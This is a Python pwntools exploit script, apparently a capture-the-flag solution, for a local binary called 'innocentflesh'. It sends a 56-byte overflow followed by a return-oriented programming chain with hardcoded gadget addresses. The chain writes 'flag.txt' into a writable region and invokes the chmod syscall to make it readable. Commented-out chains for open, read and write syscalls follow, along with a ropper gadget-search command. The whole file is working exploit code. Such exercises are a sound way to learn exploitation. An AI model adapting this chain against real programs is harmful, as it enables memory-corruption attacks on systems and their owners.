from pwn import *
import binascii

binary = "./innocentflesh"

io = process(binary)
io.readuntil("> ")

offset = 56

# readable writable region
data_addr = 0x4c0000
ropp = b''

# pop rdi; ret
ropp += p64(0x401912)
ropp += b'flag.txt'

# pop rax; ret
ropp += p64(0x451657)
ropp += p64(data_addr)

# mov qword ptr [rax], rdi; pop rbx; ret
ropp += p64(0x487804)
ropp += p64(0xcafecafe)

########### chmod  ##############
# pop rax; ret
ropp += p64(0x451657)
ropp += p64(90)

# pop rdi; ret
ropp += p64(0x401912)
ropp += p64(data_addr)

# pop rsi; ret
ropp += p64(0x40f23e)
ropp += p64(0o444)

# syscall
ropp += p64(0x41ded4)

# ########### open ##############
# # pop rax; ret
# ropp += p64(0x451657)
# ropp += p64(2)

# # pop rdi; ret
# ropp += p64(0x401912)
# ropp += p64(data_addr)

# # pop rsi; ret
# ropp += p64(0x40f23e)
# ropp += p64(0)

# # pop rdx; ret
# ropp += p64(0x40181f)
# ropp += p64(0)

# # syscall
# ropp += p64(0x41ded4)


# ########### read ##############
# # pop rax; ret
# ropp += p64(0x451657)
# ropp += p64(0)

# # pop rdi; ret
# ropp += p64(0x401912)
# ropp += p64(3)

# # pop rsi; ret 
# ropp += p64(0x40f23e)
# ropp += p64(data_addr+0x10)

# # pop rdx; ret
# ropp += p64(0x40181f)
# ropp += p64(0x30)

# # syscall
# ropp += p64(0x41ded4)

# ########### write ##############
# # pop rax; ret
# ropp += p64(0x451657)
# ropp += p64(1)

# # pop rdi; ret
# ropp += p64(0x401912)
# ropp += p64(1)

# # pop rsi; ret
# ropp += p64(0x40f23e)
# ropp += p64(data_addr+0x10)

# # pop rdx; ret 
# ropp += p64(0x40181f)
# ropp += p64(0x30)

# # syscall
# ropp += p64(0x41ded4)

payload = b"a"*offset
payload += ropp

gdb_commands = """source /usr/local/share/gef/gef.py
b *0x401dec
c"""


io.sendline(payload)

try:
    with open("flag.txt", 'r') as file:
        print(file.read())
except:
    print("Error while reading the file")

########### ropper ##############
# ropper --file ./innocentflesh --search "pop rax; ret"
